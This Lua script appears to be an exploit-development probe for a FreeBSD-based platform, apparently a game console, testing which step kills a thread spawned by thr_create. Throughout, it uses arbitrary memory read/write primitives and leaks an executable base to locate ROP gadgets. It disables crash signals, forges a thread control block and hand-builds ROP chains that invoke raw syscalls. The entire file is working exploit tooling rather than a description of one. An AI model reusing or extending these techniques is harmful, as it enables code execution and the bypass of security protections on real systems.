-- CRASH_CLASS: MODERATE
-- PROBE 560a: which step kills a thr_create(430) child?
--
-- 552a proved a 430 child can call _umtx_op(454). 559a/559b children died
-- before the parent's next print, so this probe isolates the steps:
--   [A] preamble + thr_exit only
--   [B] preamble + getpid + thr_exit
--   [C] preamble + sysctl(202) with R10 = oldlenp
-- Each stage prints before and after, so the first missing "after" line names
-- the killer.

print("=== PROBE 560a: 430 CHILD STAGES ===")
print("")
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1)); wd(N(sigact) + 8, 0); wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local sc_thr_create = mk(430)

local function run_child(steps, tag, r10, r8, r9, rdi1, rsi1, rdx1)
    local ctx = memory.alloc(0x500)
    local ca = N(ctx)
    for i = 0, 0x4FC, 4 do wd(ca + i, 0) end
    wq(ca + 0x060, uint64(r10 or 0))
    wq(ca + 0x068, uint64(r8 or 0))
    wq(ca + 0x070, uint64(r9 or 0))
    wd(ca + 0x0d0, 0)
    wq(ca + 0x108, uint64(0x480))
    wq(ca + 0x110, uint64(0x10000))
    wq(ca + 0x0c0, uint64(0x43))
    wq(ca + 0x100, uint64(0x3b))
    local stk = memory.alloc(0x8000 + 0x2000)
    local sb = N(stk)
    local rsp = sb + 0x8000 - 8
    local o = 0
    local function emit(v) wq(rsp + o, v); o = o + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(fs_ptr)))
    emit(g_pop_rax); emit(uint64(165))
    emit(stub)
    if steps >= 2 then
        emit(g_pop_rax); emit(uint64(20)); emit(stub)
    end
    if steps >= 3 then
        emit(g_pop_rdi); emit(uint64(rdi1))
        emit(g_pop_rsi); emit(uint64(rsi1))
        emit(g_pop_rdx); emit(uint64(rdx1))
        emit(g_pop_rax); emit(uint64(202))
        emit(stub)
    end
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    wq(ca + 0x0e0, g_pop_rdi)
    wq(ca + 0x0f8, uint64(rsp))
    local tp = memory.alloc(8)
    wq(N(tp), uint64(0))
    local ok, rv = pcall(function() return sc_thr_create(ctx, uint64(N(tp)), uint64(0)) end)
    print(string.format("    [%s] created ok=%s rv=%s chain=%d", tag, tostring(ok), tostring(N(rv)), o))
end

print("[A] preamble + thr_exit")
run_child(1, "A")
for i = 1, 300000 do end
print(string.format("    after A alive=%s", tostring(alive())))
if not alive() then return end

print("[B] preamble + getpid + thr_exit")
run_child(2, "B")
for i = 1, 300000 do end
print(string.format("    after B alive=%s", tostring(alive())))
if not alive() then return end

local mib = memory.alloc(16)
wd(N(mib), 1); wd(N(mib) + 4, 1); wd(N(mib) + 8, 0); wd(N(mib) + 12, 0)
local obuf = memory.alloc(0x800)
local olen = memory.alloc(16)
wd(N(olen), 0x800); wd(N(olen) + 4, 0)
print("[C] preamble + sysctl(202) with R10=oldlenp")
run_child(3, "C", N(olen), 0, 0, N(mib), 2, N(obuf))
for i = 1, 300000 do end
print(string.format("    after C alive=%s len=%d", tostring(alive()), rd(N(olen)) or 0))
print("=== DONE ===")
